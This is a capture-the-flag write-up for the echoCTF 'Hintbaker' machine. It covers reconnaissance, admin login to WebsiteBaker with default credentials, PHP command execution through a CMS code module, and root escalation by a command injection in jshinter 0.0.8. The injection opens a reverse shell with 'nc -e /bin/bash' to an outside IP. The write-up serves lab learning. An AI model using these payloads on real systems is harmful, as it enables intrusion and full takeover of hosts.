---
description: >-
  Hintbaker echoCTF Machine
title: Hintbaker (Intermediate)                # Add title here
date: 2025-02-21 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Hintbaker.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.10.10.103 sizzle.htb.local sizzle.htb htb.local
```

### Content

- Default Credentials
- Abusing WebsiteBaker CMS feature to execute PHP through an installed module
- Arbitrary Command Injection in jshinter v.0.0.8

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.226
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.226 ()   Status: Up
Host: 10.0.160.226 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.226
Nmap scan report for 10.0.160.226
Host is up, received user-set (0.16s latency).
Scanned at 2025-02-22 01:19:34 EST for 41s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 41:a1:5f:d0:c5:6d:b3:fb:f1:59:3f:45:38:9e:25:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4P5ra4eQNZDqsg+ey9OvJrOFkEHVg+EwhmaLs9lqKT
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
| http-methods: 
|_  Supported Methods: GET
|_http-title: This website for this language (ES) is still under construction
|_http-server-header: Apache/2.4.61 (Debian)
```

### Exploitation
Only port 80 is open, so first I started checking on HTTP service, it seems that the page is under construction:

![](/assets/img/Pasted-image-20250222002145.png)

Then I `dirsearch` the web page to find any interesting webpage:
```bash
dirsearch -u http://hintbaker.echocity-f.com/   

Target: http://hintbaker.echocity-f.com/

[23:57:29] Starting:                                        
[23:58:03] 301 -  338B  - /account  ->  http://hintbaker.echocity-f.com/account/
[23:58:03] 200 -  773B  - /account/                                         
[23:58:03] 200 -    1KB - /account/login.php                                
[23:58:05] 301 -  336B  - /admin  ->  http://hintbaker.echocity-f.com/admin/
[23:58:07] 302 -    0B  - /admin/  ->  http://hintbaker.echocity-f.com/admin/start/index.php
[23:58:08] 302 -    0B  - /admin/index.php  ->  http://hintbaker.echocity-f.com/admin/start/index.php
[23:58:08] 301 -  342B  - /admin/login  ->  http://hintbaker.echocity-f.com/admin/login/
``` 

I then access to the `/admin` webpage and tried to login using Default Credentials, and I got the pair `admin:password1234`, once inside I started browsing through the interface while capturing my requests using BurpSuite, I did not identify anything like an administrative console, so I research online and found a exploit [WebsiteBaker 2.13.0 - Remote Code Execution (RCE) ](https://www.exploit-db.com/exploits/50310?utm_source=chatgpt.com). However, the exploit did not worked because the version of the app was 2.13.5, then I just tried by abusing the admin privileges.

First you'll need to go to the `Páginas` menu and create a webpage (you'll see all the created pages at `/` root path), I called mine `test3.php` with the option `Code v3.0.9`:
![](/assets/img/Pasted-image-20250222002721.png)

Then, I tried using php code, but there was an error `There was an uncatched exception syntax error, unexpected token "<", expecting end of file in line (1) of (/modules/code/view.php(32) : eval()'d code):` after searching for it, that means that we don't need to put all the PHP code but only what you want to execute inside the `eval()` function:
```bash
echo system('id');
```
Then if you go to `http://hintbaker.echocity-f.com/` you'll see your new page where the `id` command is executed:
![](/assets/img/Pasted-image-20250222003840.png)

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@hintbaker:/tmp$ sudo -l
Matching Defaults entries for www-data on hintbaker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on hintbaker:
    (ALL : ALL) NOPASSWD: /usr/bin/hintbaker
```
Its content is like this:
```bash
#! /usr/bin/env node
var hinter = require('jshinter');
var args = process.argv.slice(2);

jsLint=new hinter["lintJsFile"](args[0],args[1])();
console.log(jsLint);
```
The best bit of this script is the 'jshinter' library. I found the version of it by following the package.json file for the library, and this is what I found:
```bash
www-data@hintbaker:/usr/lib/node_modules/hintbaker/node_modules/jshinter$ cat package.json 
{
  "name": "jshinter",
  "version": "0.0.8",
  "description": "wrapper around JSHint that lets you call it from Node.",
  "main": "jshinter.js",
  "repository"    : {"type": "git", "url": "git@github.com:tborenst/jshinter.git"},
```
After some research about it, I came up with this [Arbitrary Command Injection](https://gist.github.com/icemonster/88eaf026cedb435408ca023a9d445de0), after some testing and some ChatGPT prompts I ended with this payload:
```bash
www-data@hintbaker:/tmp$ sudo /usr/bin/hintbaker '$(nc -e /bin/bash 10.10.5.122 1234) # \" || nc -e /bin/bash 10.10.5.122 1234 # \" || nc -e /bin/bash 10.10.5.122 1234'
```
AND WE ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Credentials used on WebsiteBaker CMS are `admin:password1234`

### Notes

- It is really important to track where the software that might be vulnerable is located, specially on NodeJS, you can do this by check if there is a symlink on it, and if so the folder where the index.js is placed, then all you need to do is track the node_modules folder, the most common path is `/usr/lib/node_modules/hintbaker/node_modules/`.

### References

-  [WebsiteBaker 2.13.0 - Remote Code Execution (RCE) ](https://www.exploit-db.com/exploits/50310?utm_source=chatgpt.com)
-  [Arbitrary Command Injection](https://gist.github.com/icemonster/88eaf026cedb435408ca023a9d445de0)


